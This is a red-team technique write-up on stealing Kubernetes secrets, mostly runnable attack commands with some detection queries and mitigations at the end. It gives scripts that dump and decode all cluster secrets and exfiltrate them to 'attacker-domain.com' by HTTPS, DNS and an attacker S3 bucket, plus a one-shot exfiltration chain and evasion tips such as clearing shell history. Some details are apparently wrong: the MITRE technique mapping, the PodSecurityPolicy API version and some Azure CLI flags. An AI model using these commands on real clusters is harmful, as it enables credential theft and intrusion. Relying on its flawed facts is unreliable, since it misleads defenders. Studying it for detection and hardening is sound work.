# [CONTAINER-002]: Container Orchestration Secret Theft

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CONTAINER-002 |
| **MITRE ATT&CK v18.1** | [T1555.002 - Credentials from Password Stores: Securityd Memory](https://attack.mitre.org/techniques/T1555/002/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID (Kubernetes, AKS, container orchestration platforms) |
| **Severity** | Critical |
| **CVE** | N/A (General technique affecting multiple container platforms) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Kubernetes 1.0+, all versions with mounted secrets |
| **Patched In** | Kubernetes 1.29+ (with short-lived token support enabled) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Container Orchestration Secret Theft targets the credential storage mechanisms inherent to Kubernetes and similar orchestration platforms. Unlike traditional password store theft (DPAPI, Keychain), this technique exploits the declarative nature of container secrets, where credentials are stored in plaintext or weakly encrypted format in etcd backends, as environment variables in pod specifications, or mounted as volume files accessible from compromised containers. An attacker with pod execution access can enumerate, extract, and exfiltrate secrets containing database passwords, API keys, SSL certificates, and cloud credentials—bypassing traditional credential protection mechanisms. The technique leverages the trust relationship between pods and the Kubernetes API server, where service account tokens grant automatic API access to list and retrieve secrets.

**Attack Surface:** Kubernetes etcd database (default unencrypted or AES-CBC encrypted), Secret resources mounted as environment variables or volumes, ConfigMaps misused for credential storage, application configuration files within containers, and pipeline environment variables in DevOps platforms.

**Business Impact:** **Cascading credential compromise leading to infrastructure-wide lateral movement and data exfiltration.** Attackers obtaining database passwords can directly compromise production databases, access cloud storage, manipulate CI/CD pipelines, pivot to on-premises infrastructure via VPN credentials, and maintain persistent backdoor access through service principal credentials. The impact multiplies when secrets contain cross-tenant credentials (multi-cloud, hybrid infrastructure) or administrative tokens.

**Technical Context:** Extraction is near-instantaneous (milliseconds) once pod access is obtained. Secrets are stored in Base64 encoding (not cryptographic encryption) by default, making decoding trivial. Even with encryption enabled, misconfigured RBAC often grants pod service accounts permission to list and read secrets. Detection requires comprehensive API audit logging; many organizations run Kubernetes without audit logging enabled, making this technique nearly silent.

### Operational Risk

- **Execution Risk:** Low – Requires only pod execution access and basic kubectl/curl knowledge
- **Stealth:** High – Silent if RBAC and audit logging are misconfigured (common scenario)
- **Reversibility:** No – Extracted credentials remain valid until manually rotated or services are decommissioned

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Kubernetes Benchmark** | 5.1.2, 5.2.1 | RBAC enforcement for secrets access; encryption at rest |
| **DISA STIG** | V-242380 | Kubernetes must enforce RBAC for API access to secrets |
| **CISA SCuBA** | AC-3, SC-13 | Access enforcement; cryptographic protection of sensitive data |
| **NIST 800-53** | AC-2, SC-7, SC-28 | Account management; information system boundary protection; information at rest encryption |
| **GDPR** | Articles 32, 33 | Security of processing; data breach notification requirements |
| **DORA** | Articles 6, 9 | Information and communication technology (ICT) security; incident reporting |
| **NIS2** | Articles 19, 21 | Security requirements for critical infrastructure; risk management measures |
| **ISO 27001** | A.10.2.1, A.13.1.3 | Secure development policy; data leakage prevention; information transfer agreements |
| **ISO 27005** | Section 8.3.1 | Risk assessment for credential compromise scenarios |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Pod execution access (any container in the cluster)
- **Required Access:** Access to Kubernetes API server (localhost:6443 from within pod) or kubelet API (localhost:10250)

**Supported Versions:**
- **Kubernetes:** 1.0 - 1.29+ (all versions vulnerable without full mitigation)
- **Container Runtimes:** Docker, containerd, CRI-O (all equally vulnerable)
- **Platforms:** AKS, EKS, GKE, on-premises Kubernetes, any container orchestration using etcd

**Tools:**
- [kubectl](https://kubernetes.io/docs/reference/kubectl/) (v1.10+)
- [curl](https://curl.se/) (7.0+)
- [Base64 utilities](https://linux.die.net/man/1/base64) (coreutils)
- [jq](https://stedolan.github.io/jq/) (1.6+) - Optional, for JSON parsing

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Pod Service Account Discovery

**Command (Bash/Linux):**
```bash
# Check if running inside pod
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo "[+] Running in Kubernetes pod"
  NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  CA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
  echo "[+] Service Account Namespace: $NAMESPACE"
  echo "[+] Token Length: ${#TOKEN}"
fi

# Check if pod has API access
curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert $CA \
  "https://kubernetes.default.svc.cluster.local/api/v1/namespaces" 2>&1 | \
  jq '.items[].metadata.name' 2>/dev/null | head -5
```

**What to Look For:**
- Service account token file present (confirms pod context)
- Successful API response listing namespaces (confirms API access)
- Any output other than 401/403 (API is accessible)

### RBAC Permission Enumeration

**Command:**
```bash
# Check what the current service account can do
kubectl auth can-i get secrets --as=system:serviceaccount:$NAMESPACE:default
kubectl auth can-i list secrets --namespace=$NAMESPACE
kubectl auth can-i create pods

# Test if we can access secrets from other namespaces
kubectl get secrets --all-namespaces 2>&1 | head -5
```

**What to Look For:**
- "yes" responses indicate the service account has those permissions
- Listing all namespaces means RBAC is not restricting cross-namespace access (highly vulnerable)
- "Forbidden" means restrictive RBAC, but attack still possible if default permissions are granted

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Environment Variable Secret Extraction via Pod Specification

**Supported Versions:** Kubernetes 1.0 - 1.29+ (all versions)

#### Step 1: Discover Secrets and ConfigMaps in Current Namespace

**Objective:** Identify available secrets and determine their content types

**Command:**
```bash
# List all secrets in current namespace
kubectl get secrets -n $NAMESPACE -o wide

# List secrets with detailed information
kubectl get secrets -n $NAMESPACE -o json | jq '.items[] | {name: .metadata.name, type: .type, keys: .data | keys}'

# Example output parsing
for secret in $(kubectl get secrets -n $NAMESPACE -o jsonpath='{.items[*].metadata.name}'); do
  echo "Secret: $secret"
  kubectl get secret $secret -n $NAMESPACE -o jsonpath='{.data}' | jq 'keys'
done
```

**Expected Output:**
```json
{
  "name": "db-credentials",
  "type": "Opaque",
  "keys": ["database-password", "database-username"]
}
{
  "name": "api-keys",
  "type": "Opaque",
  "keys": ["aws-access-key", "aws-secret-key"]
}
```

**What This Means:**
- Secrets are directly accessible via kubectl
- Keys list shows what credentials are stored
- "Opaque" type indicates generic key-value secrets (most common)

**OpSec & Evasion:**
- kubectl commands are logged in Kubernetes audit logs if audit level is "RequestResponse"
- Use direct API calls via curl instead (slightly harder to log)
- Detection likelihood: Medium if audit logging enabled, Low otherwise

---

#### Step 2: Decode Base64-Encoded Secret Values

**Objective:** Extract plaintext credentials from Base64-encoded secrets

**Command:**
```bash
# Get single secret value and decode
kubectl get secret db-credentials -n $NAMESPACE -o jsonpath='{.data.database-password}' | base64 -d

# Or decode directly in JSON
kubectl get secret db-credentials -n $NAMESPACE -o json | \
  jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'

# Mass decode all secrets in namespace
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: (.data | map_values(@base64d))}' > /tmp/all_secrets.json
```

**Expected Output:**
```json
{
  "namespace": "production",
  "name": "db-credentials",
  "data": {
    "database_password": "SuperSecret123!",
    "database_username": "admin"
  }
}
```

**What This Means:**
- Base64 encoding is NOT encryption (trivially reversible)
- Plaintext credentials are immediately usable for lateral movement
- Multiple secrets can be dumped simultaneously

**OpSec & Evasion:**
- Store decoded secrets in memory; avoid writing to disk
- Use `history -c` to clear shell history after extraction
- Exfiltrate immediately; don't keep credentials in pod filesystem

---

#### Step 3: Extract Secrets from All Namespaces

**Objective:** Perform lateral movement by discovering cross-namespace credentials

**Command:**
```bash
# Check if default service account can access all namespaces
kubectl get secrets --all-namespaces 2>&1

# If successful, dump all secrets
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type != "kubernetes.io/service-account-token")' > /tmp/all_secrets.json

# Parse and exfiltrate
cat /tmp/all_secrets.json | jq '.metadata.namespace, .metadata.name, .data | to_entries[] | {key: .key, value: (.value | @base64d)}' | grep -v "^null" > /tmp/extracted_creds.txt

# Extract only sensitive keys (passwords, keys, tokens)
jq '.data | to_entries[] | select(.key | contains("password") or contains("key") or contains("token")) | {namespace: .namespace, secret: .name, key: .key, value: (.value | @base64d)}' /tmp/all_secrets.json
```

**Expected Output:**
```
production/db-credentials: password=SuperSecret123!
production/api-keys: aws_secret_key=AKIAIOSFODNN7EXAMPLE
kube-system/coredns-token: token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkJWM1...
```

**What This Means:**
- Multiple credential sources are harvested simultaneously
- Cross-namespace access indicates insufficient RBAC restrictions
- Service account tokens in kube-system enable cluster-wide access

**OpSec & Evasion:**
- Enumerate methodically to avoid detection thresholds
- Use time delays between requests to evade anomaly detection
- Detection likelihood: High if RBAC audit logging is enabled and monitored in real-time

---

#### Step 4: Exfiltrate Credentials to Attacker Infrastructure

**Objective:** Move credentials outside the cluster for safe storage and usage

**Command:**
```bash
# Exfiltrate via HTTPS to attacker-controlled server
curl -s -X POST "https://attacker-domain.com/callback" \
  -H "Content-Type: application/json" \
  -d "{\"secrets\": $(cat /tmp/extracted_creds.txt | jq -c .)}" \
  --silent --output /dev/null

# Or encode in DNS query (if HTTPS is blocked)
for secret in $(cat /tmp/extracted_creds.txt | jq -r '.[]'); do
  nslookup "$(echo $secret | base64)".attacker-domain.com
done

# Or upload to attacker-controlled S3 bucket (if pod has cloud credentials)
AWS_ACCESS_KEY_ID=$(jq -r '.aws_access_key' /tmp/extracted_creds.txt) \
AWS_SECRET_ACCESS_KEY=$(jq -r '.aws_secret_key' /tmp/extracted_creds.txt) \
aws s3 cp /tmp/extracted_creds.txt s3://attacker-bucket/data.json --region us-east-1
```

**OpSec & Evasion:**
- Use legitimate TLS to blend in with normal HTTPS traffic
- Consider adding random delays and fake requests to evade pattern detection
- If DNS exfiltration, split data into multiple DNS queries
- Clean up `/tmp/extracted_creds.txt` after exfiltration

**Troubleshooting:**
- **Error:** "Connection timed out" on curl to attacker domain
  - **Cause:** Egress filtering or network policies blocking outbound connections
  - **Fix:** Use DNS exfiltration, DNS-over-HTTPS (DoH), or co-located attacker infrastructure
  - **Fix:** Attempt exfiltration via pod-to-pod communication if multi-tenant cluster

---

### METHOD 2: API Server Direct Secret Enumeration (curl-based)

**Supported Versions:** Kubernetes 1.10+

#### Step 1: Authenticate to API Server via Service Account Token

**Objective:** Establish authenticated API connection without kubectl

**Command:**
```bash
# Read service account credentials
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API_SERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# Test API access
curl -s -X GET "$API_SERVER/api/v1/namespaces" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.items[] | .metadata.name'
```

**Expected Output:**
```
default
kube-system
kube-public
production
```

**What This Means:**
- Service account token is valid and has API access
- Multiple namespaces are visible (potential for lateral movement)
- API server is responsive and authentication is successful

---

#### Step 2: List All Secrets via API

**Objective:** Programmatic secret enumeration without kubectl

**Command:**
```bash
# List secrets in single namespace
curl -s -X GET "$API_SERVER/api/v1/namespaces/$NAMESPACE/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.items[] | {name: .metadata.name, type: .type}'

# List secrets in all namespaces
curl -s -X GET "$API_SERVER/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name}'

# Filter for sensitive secret types
curl -s -X GET "$API_SERVER/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.items[] | select(.type | contains("docker") or contains("rsa") or contains("tls"))'
```

**Expected Output:**
```json
{
  "namespace": "production",
  "name": "docker-registry-secret",
  "type": "kubernetes.io/dockercfg"
}
{
  "namespace": "kube-system",
  "name": "tls-secret",
  "type": "kubernetes.io/tls"
}
```

**What This Means:**
- Docker credentials are accessible
- TLS certificates can be extracted (enabling man-in-the-middle attacks)
- Secret names reveal application architecture and infrastructure

---

#### Step 3: Extract Individual Secret Data

**Objective:** Retrieve and decode specific secret values

**Command:**
```bash
# Get single secret in JSON format
curl -s -X GET "$API_SERVER/api/v1/namespaces/production/secrets/db-credentials" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.data'

# Decode Base64 values in one command
curl -s -X GET "$API_SERVER/api/v1/namespaces/production/secrets/db-credentials" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'

# Extract specific field (e.g., password only)
curl -s -X GET "$API_SERVER/api/v1/namespaces/production/secrets/db-credentials" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq -r '.data.database_password | @base64d'
```

**Expected Output:**
```
SuperSecret123!
postgresql://admin:SuperSecret123!@db.internal:5432/prod_db
```

**What This Means:**
- Complete credentials are extracted
- Connection strings reveal backend infrastructure
- Credentials can be used immediately for direct database access

---

#### Step 4: Mass Secret Extraction and JSON Export

**Objective:** Bulk export of all secrets for offline analysis

**Command:**
```bash
# Create comprehensive secret dump
curl -s -X GET "$API_SERVER/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.items[] | {
    namespace: .metadata.namespace,
    name: .metadata.name,
    type: .type,
    data: (.data | map_values(@base64d))
  }' > /tmp/kubernetes_secrets_dump.json

# Or export to CSV for spreadsheet analysis
curl -s -X GET "$API_SERVER/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq -r '.items[] | [.metadata.namespace, .metadata.name, .type, (.data | length)] | @csv' > /tmp/secrets.csv

# Count secrets by namespace
curl -s -X GET "$API_SERVER/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert $CA | jq '.items | group_by(.metadata.namespace) | map({namespace: .[0].metadata.namespace, count: length})'
```

**Expected Output (CSV):**
```
namespace,name,type,key_count
production,db-credentials,Opaque,3
production,api-keys,Opaque,2
kube-system,coredns-token,kubernetes.io/service-account-token,3
```

**What This Means:**
- Comprehensive inventory of all cluster credentials
- Can be used for further targeting (e.g., focus on secrets with many keys)
- Enables offline analysis of credential landscape

---

### METHOD 3: ConfigMap Exploitation (Misused for Credential Storage)

**Supported Versions:** Kubernetes 1.0+

#### Step 1: Discover ConfigMaps Storing Sensitive Data

**Objective:** Identify ConfigMaps that contain credentials (anti-pattern)

**Command:**
```bash
# List all ConfigMaps
kubectl get configmaps --all-namespaces

# Search for ConfigMaps with suspicious names
kubectl get configmaps --all-namespaces -o json | jq '.items[] | select(.metadata.name | contains("secret") or contains("password") or contains("credential") or contains("key"))'

# Extract specific ConfigMap content
kubectl get configmap application-config -n production -o jsonpath='{.data}' | jq '.'
```

**Expected Output:**
```json
{
  "database_host": "db.internal",
  "database_port": "5432",
  "database_username": "admin",
  "database_password": "SuperSecret123!",
  "api_key": "sk-1234567890abcdef"
}
```

**What This Means:**
- ConfigMaps are plaintext key-value stores (not even Base64 encoded!)
- Developers mistakenly store credentials in ConfigMaps
- All values are immediately accessible without decoding

**OpSec & Evasion:**
- ConfigMap access is logged at the same level as Secrets
- Similar audit trail to secret extraction

---

#### Step 2: Extract All ConfigMaps

**Objective:** Dump all application configurations

**Command:**
```bash
# Export all ConfigMaps in YAML format
kubectl get configmaps --all-namespaces -o yaml > /tmp/all_configmaps.yaml

# Extract only data sections
kubectl get configmaps --all-namespaces -o json | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: .data}'

# Search for patterns (passwords, keys, connection strings)
kubectl get configmaps --all-namespaces -o json | jq '.items[].data | select(. != null) | to_entries[] | select(.value | contains("password") or contains("://") or contains("key=") or contains("token="))'
```

---

### METHOD 4: Service Account Token Theft from Mounted Paths

**Supported Versions:** Kubernetes 1.0+

#### Step 1: Retrieve Mounted Service Account Token

**Objective:** Extract token that grants API access

**Command:**
```bash
# Standard location for mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Store for exfiltration
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Verify token format (should be JWT with three Base64 segments)
echo $TOKEN | tr '.' '\n' | head -1
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkJWM1pQRWFhQ0k4eFc2QWVDMDlRRkJqTVRQMFpUZzBOVGRHTmpoVE16TkVRUT09In0.eyJpc3MiOiJodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2NhbCIsImN1YiI6e...
```

**What This Means:**
- Token is a valid JWT (JSON Web Token)
- Valid for accessing Kubernetes API
- Can be used from any location with network access to API server

---

#### Step 2: Use Token for Remote Cluster Access

**Objective:** Authenticate to cluster from attacker machine

**Command (From Attacker's Machine):**
```bash
# Create kubeconfig file
cat > ~/.kube/config << 'EOF'
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: <base64-encoded-ca-cert>
    server: https://<aks-cluster>.azmk8s.io:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: service-account
  name: service-account@kubernetes
current-context: service-account@kubernetes
kind: Config
preferences: {}
users:
- name: service-account
  user:
    token: <EXFILTRATED_TOKEN>
EOF

# Use token to access cluster
kubectl get secrets --all-namespaces
kubectl get pods -n production
```

**What This Means:**
- Attacker has remote cluster access
- Can perform all operations allowed by the service account
- No kubectl or pod execution required

---

## 6. ATTACK SIMULATION & VERIFICATION

### Manual Attack Verification Steps

**Prerequisite:** Pod execution access in Kubernetes cluster

**Verification Command:**
```bash
# Step 1: Check pod context
echo "=== Pod Environment ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
env | grep KUBERNETES

# Step 2: Test API access
echo "=== API Access Test ==="
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  "https://kubernetes.default/api/v1/namespaces" | jq '.items | length'

# Step 3: List secrets (attack simulation)
echo "=== Secret Enumeration ==="
kubectl get secrets --all-namespaces | wc -l

# Step 4: Extract sample credential
echo "=== Sample Credential Extraction ==="
kubectl get secret -n kube-system -o json | jq '.items[0].data' | head -1

echo "=== Verification Complete ==="
```

**Expected Output (If Vulnerable):**
```
=== Pod Environment ===
default
KUBERNETES_SERVICE_HOST=10.0.0.1
KUBERNETES_SERVICE_PORT=443

=== API Access Test ===
5

=== Secret Enumeration ===
47

=== Sample Credential Extraction ===
{"ca.crt": "LS0tLS1CRUdJTi...", "namespace": "a3ViZS1zeXN0ZW0=", "token": "eyJhbGc..."}

=== Verification Complete ===
```

---

## 7. TOOLS & COMMANDS REFERENCE

### [kubectl](https://kubernetes.io/docs/reference/kubectl/)

**Version:** 1.19+
**Installation:** See CONTAINER-001 section for full installation
**Usage for Secret Access:**
```bash
# List secrets in current namespace
kubectl get secrets

# Decode specific secret
kubectl get secret <name> -o jsonpath='{.data}' | jq 'to_entries[] | {key: .key, value: (.value | @base64d)}'

# Export all secrets to file
kubectl get secrets --all-namespaces -o json > secrets_backup.json
```

---

### [jq](https://stedolan.github.io/jq/)

**Version:** 1.6+
**Minimum Version:** 1.5
**Supported Platforms:** Linux, macOS, Windows

**Installation:**
```bash
# Linux (Debian/Ubuntu)
sudo apt-get install jq

# macOS
brew install jq

# Windows (PowerShell)
choco install jq
```

**Usage for Secret Parsing:**
```bash
# Decode all secrets in JSON
jq '.items[] | {name: .metadata.name, data: (.data | map_values(@base64d))}'

# Filter for specific secret type
jq '.items[] | select(.type == "Opaque")'
```

---

### [curl](https://curl.se/)

**Installation & Version Info:** See CONTAINER-001 section

**Usage for API Secret Access:**
```bash
# Direct API call to list secrets
curl -s -X GET "https://kubernetes.default/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | jq '.items'
```

---

### One-Liner: Complete Secret Exfiltration

```bash
#!/bin/bash
# CONTAINER-002 secret extraction and exfiltration chain

NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API="https://kubernetes.default/api/v1"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Extract all secrets
curl -s "$API/secrets" -H "Authorization: Bearer $TOKEN" --cacert $CA | \
jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: (.data | map_values(@base64d))}' | \
# Exfiltrate to attacker infrastructure
curl -X POST "https://attacker-domain.com/callback" -d @- --silent --output /dev/null

echo "[+] Secrets exfiltrated"
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Secret Enumeration Attack

**Rule Configuration:**
- **Required Table:** AzureDiagnostics (Kubernetes audit logs)
- **Required Fields:** properties.verb, properties.objectRef.resource, properties.sourceIPs
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** AKS 1.19+

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.CONTAINERSERVICE"
  and Category == "kube-audit"
  and (properties.verb == "list" or properties.verb == "get")
  and properties.objectRef.resource == "secrets"
| extend user = tostring(properties.user.username),
         sourceIP = tostring(properties.sourceIPs[0]),
         namespace = tostring(properties.objectRef.namespace)
| summarize SecretAccessCount = count(),
            UniqueNamespaces = dcount(namespace),
            UniqueResources = dcount(properties.objectRef.name)
            by user, sourceIP, bin(TimeGenerated, 5m)
| where SecretAccessCount > 10 or UniqueNamespaces > 2
| project TimeGenerated, user, sourceIP, SecretAccessCount, UniqueNamespaces, UniqueResources
```

**What This Detects:**
- Bulk secret enumeration (>10 list operations in 5 minutes)
- Cross-namespace secret access
- Service account or user accessing more secrets than typical baseline

**Manual Configuration Steps (Azure Portal):**
1. Go to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Kubernetes Secret Enumeration Attack`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run query every: `5 minutes`
   - Lookup data from the last: `15 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

#### Query 2: Credential Access Pattern Detection

**Rule Configuration:**
- **Required Table:** AzureDiagnostics
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.CONTAINERSERVICE"
  and Category == "kube-audit"
  and properties.objectRef.resource == "secrets"
  and properties.verb in ("get", "list")
  and properties.requestStatus == "Success"
| extend user = tostring(properties.user.username),
         secretName = tostring(properties.objectRef.name),
         namespace = tostring(properties.objectRef.namespace)
| where secretName matches regex "(password|api|key|credential|token|secret)"
| summarize Attempts = count(),
            UniqueSecrets = dcount(secretName)
            by user, namespace, bin(TimeGenerated, 10m)
| where Attempts > 3 or UniqueSecrets > 2
| project TimeGenerated, user, namespace, Attempts, UniqueSecrets
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Note:** Direct Kubernetes secret access is not logged in Windows Event Viewer. However, if Azure Monitor Agent is deployed on nodes and collecting kubelet logs:

**Manual Configuration Steps (Enable Pod Logs in AKS):**
1. Go to **AKS Cluster** → **Diagnostic settings**
2. Enable **kube-audit** and **kube-audit-admin** logs
3. Send to **Log Analytics Workspace**
4. Query via Azure Monitor / Sentinel (see section 9 above)

---

## 11. SYSMON DETECTION PATTERNS

**Note:** Sysmon cannot directly detect Kubernetes secret access (API server logs are the primary source). However, can detect suspicious local behaviors:

**Sysmon Configuration (XML):**
```xml
<Sysmon schemaversion="4.80">
  <EventFiltering>
    <RuleGroup name="ContainerSecretTheft" groupRelation="or">
      <!-- Monitor for base64 encoding/decoding in containers -->
      <ProcessCreate onmatch="include">
        <Image condition="contains">base64</Image>
        <CommandLine condition="contains">-d</CommandLine>
      </ProcessCreate>
      
      <!-- Monitor for kubectl/curl API calls -->
      <ProcessCreate onmatch="include">
        <Image condition="contains">kubectl</Image>
        <CommandLine condition="contains">secrets</CommandLine>
      </ProcessCreate>
      
      <!-- Monitor for credential file writes -->
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">/tmp/creds</TargetFilename>
        <TargetFilename condition="contains">extracted</TargetFilename>
      </FileCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Suspicious Kubernetes Secret Access`
- **Severity:** Critical
- **Description:** Detects bulk secret enumeration or access to sensitive credentials
- **Applies To:** AKS clusters with Defender for Containers enabled
- **Remediation:**
  1. Review audit logs for secret access
  2. Rotate accessed credentials
  3. Implement RBAC restrictions on secret access
  4. Enable secret encryption at rest

**Reference:** [Microsoft Defender for Cloud Documentation](https://learn.microsoft.com/en-us/azure/defender-for-cloud/)

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enable RBAC Restrictions on Secrets:** Prevent default service accounts from accessing all secrets
    **Applies To Versions:** Kubernetes 1.19+
    
    **Manual Steps:**
    ```bash
    # Remove default service account from secret access
    kubectl delete clusterrolebinding view --ignore-not-found
    
    # Create restrictive role for default service account
    kubectl apply -f - << 'EOF'
    apiVersion: rbac.authorization.k8s.io/v1
    kind: Role
    metadata:
      name: restricted-secret-access
      namespace: default
    rules:
    - apiGroups: [""]
      resources: ["pods", "pods/log"]
      verbs: ["get", "list"]
    # Note: No "secrets" in resources - secrets are NOT accessible
    EOF
    
    kubectl apply -f - << 'EOF'
    apiVersion: rbac.authorization.k8s.io/v1
    kind: RoleBinding
    metadata:
      name: restricted-access
      namespace: default
    roleRef:
      apiGroup: rbac.authorization.k8s.io
      kind: Role
      name: restricted-secret-access
    subjects:
    - kind: ServiceAccount
      name: default
      namespace: default
    EOF
    ```
    
    **Validation Command:**
    ```bash
    kubectl auth can-i get secrets --as=system:serviceaccount:default:default
    # Expected output: no
    ```

*   **Encrypt Secrets at Rest in etcd:** Prevent plaintext storage
    **Applies To Versions:** Kubernetes 1.12+
    
    **Manual Steps (AKS):**
    ```bash
    # Enable encryption at rest for AKS
    az aks update --name myCluster --resource-group myRG \
      --network-policy azure --enable-disk-encryption
    ```
    
    **Manual Steps (On-Premises Kubernetes):**
    1. Create encryption configuration file (`/etc/kubernetes/encryption.yaml`):
    ```yaml
    apiVersion: apiserver.config.k8s.io/v1
    kind: EncryptionConfiguration
    resources:
    - resources:
      - secrets
      providers:
      - aescbc:
          keys:
          - name: key1
            secret: <base64-encoded-32-byte-secret>
      - identity: {}
    ```
    2. Update API server manifest to include `--encryption-provider-config=/etc/kubernetes/encryption.yaml`
    3. Restart API server and verify encryption is active

*   **Use Workload Identity Instead of Service Account Tokens:** Azure-specific mitigation
    **Applies To Versions:** AKS with Workload Identity enabled
    
    **Manual Steps:**
    ```bash
    # Enable Workload Identity on AKS cluster
    az aks update --name myCluster --resource-group myRG \
      --enable-oidc-issuer --enable-workload-identity-oidc
    
    # Create Azure managed identity
    az identity create --name myIdentity --resource-group myRG
    
    # Bind Kubernetes service account to Azure identity
    az aks pod-identity binding create --resource-group myRG \
      --cluster-name myCluster --namespace default \
      --service-account-name myServiceAccount \
      --identity-resource-id /subscriptions/.../resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myIdentity
    ```

### Priority 2: HIGH

*   **Implement Pod Security Policy / Pod Security Standards:** Prevent privileged pod execution
    **Manual Steps:**
    ```bash
    # Deploy Pod Security Standard
    kubectl apply -f - << 'EOF'
    apiVersion: policy/v1alpha1
    kind: PodSecurityPolicy
    metadata:
      name: restricted
    spec:
      privileged: false
      allowPrivilegeEscalation: false
      requiredDropCapabilities:
      - ALL
      volumes:
      - 'configMap'
      - 'emptyDir'
      - 'projected'
      - 'secret'
      hostNetwork: false
      hostIPC: false
      hostPID: false
      runAsUser:
        rule: 'MustRunAsNonRoot'
    EOF
    ```

*   **Audit Logging for Secret Access:** Maintain comprehensive audit trail
    **Manual Steps (AKS):**
    ```bash
    # Enable audit logging in diagnostic settings
    az monitor diagnostic-settings create \
      --name AKS-audit \
      --resource /subscriptions/{sub}/resourcegroups/{rg}/providers/Microsoft.ContainerService/managedClusters/{cluster} \
      --logs '[{"category":"kube-audit","enabled":true}]' \
      --workspace <log-analytics-workspace-id>
    ```

#### Access Control & RBAC Hardening

*   **Principle of Least Privilege for Service Accounts:**
    ```bash
    # Audit current permissions
    kubectl describe serviceaccount default -n default
    
    # Remove unnecessary roles
    kubectl delete clusterrolebinding <role-name> --ignore-not-found
    
    # Assign minimal roles only when needed
    ```

#### Network & Encryption

*   **Use TLS for all Kubernetes API Communication:** Ensure encrypted transmission
    **Validation Command:**
    ```bash
    kubectl get endpoints kubernetes -o jsonpath='{.subsets[0].addresses[0].ip}' && \
    echo " - verify API server uses HTTPS"
    ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Kubernetes Audit Log Patterns:**
  - Multiple `list secrets` operations from single service account in short time span
  - `get` operations on secrets from non-application service accounts (e.g., default)
  - API calls from pod IPs accessing secrets in different namespaces
  - Base64 decoding operations (if application logs are captured)

*   **Network Indicators:**
  - Outbound HTTPS connections from pod to external domains (data exfiltration)
  - Pod making API calls to kubeconfig files or metadata endpoints
